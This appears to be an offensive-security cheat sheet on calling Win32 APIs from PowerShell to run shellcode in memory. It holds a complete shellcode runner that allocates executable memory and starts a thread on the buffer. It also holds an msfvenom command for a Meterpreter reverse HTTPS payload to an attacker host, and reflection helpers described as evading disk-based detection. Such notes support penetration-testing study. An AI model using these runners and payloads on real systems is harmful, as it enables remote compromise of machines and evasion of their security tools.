---
tags:
  - Advanced
  - Binary_Exploitation
  - Code_Injection
  - Defense_Evasion
  - Execution
  - PowerShell
  - Windows
---

## Win32 APIs from PowerShell
resources: [P/Invoke Wiki](http://www.pinvoke.net/)

> [!info] PowerShell can call Win32 APIs through .NET P/Invoke or reflection. Enables in-memory shellcode execution.

### Add-Type Method (Touches Disk)

> [!warning] Compiles C# code at runtime. Creates temporary files on disk.

```powershell
$code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $code
```

### PowerShell Shellcode Runner (Add-Type)

#### Generate Shellcode [Local]
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<AttackerIP> LPORT=<Port> -f ps1
```

#### Complete Runner Script
```powershell
$code = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $code

# msfvenom shellcode
[Byte[]] $buf = 0xfc,0x48,0x83,...

# Allocate RWX memory
$size = $buf.Length
$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40)

# Copy shellcode
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

# Execute
$thandle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0)
[Win32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```

## In-Memory Execution (No Disk)

> [!tip] Use reflection to avoid disk writes. More evasive than **Add-Type**.

### UnsafeNativeMethods Approach

> [!tip] Leverage existing .NET assemblies that already have P/Invoke signatures.

```powershell
# Get reference to Microsoft.Win32.UnsafeNativeMethods
$systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
$unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')

# Get GetProcAddress method
$getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

# Get GetModuleHandle method
$getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
```

### Get Function Address Helper
```powershell
function Get-ProcAddress {
    Param(
        [Parameter(Mandatory=$true)][String]$Module,
        [Parameter(Mandatory=$true)][String]$Function
    )

    $systemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1] -eq 'System.dll' }
    $unsafeNativeMethods = $systemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    $getModuleHandle = $unsafeNativeMethods.GetMethod('GetModuleHandle')
    $getProcAddress = $unsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))

    $moduleHandle = $getModuleHandle.Invoke($null, @($Module))
    $handleRef = New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $moduleHandle)

    return $getProcAddress.Invoke($null, @($handleRef, $Function))
}
```

### Delegate Type Creation
```powershell
function Get-DelegateType {
    Param(
        [Parameter(Mandatory=$true)][Type[]]$Parameters,
        [Parameter(Mandatory=$true)][Type]$ReturnType
    )

    $domain = [AppDomain]::CurrentDomain
    $dynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $assemblyBuilder = $domain.DefineDynamicAssembly($dynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $moduleBuilder = $assemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $typeBuilder = $moduleBuilder.DefineType('DelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

    $constructorBuilder = $typeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $constructorBuilder.SetImplementationFlags('Runtime, Managed')

    $methodBuilder = $typeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $methodBuilder.SetImplementationFlags('Runtime, Managed')

    return $typeBuilder.CreateType()
}
```
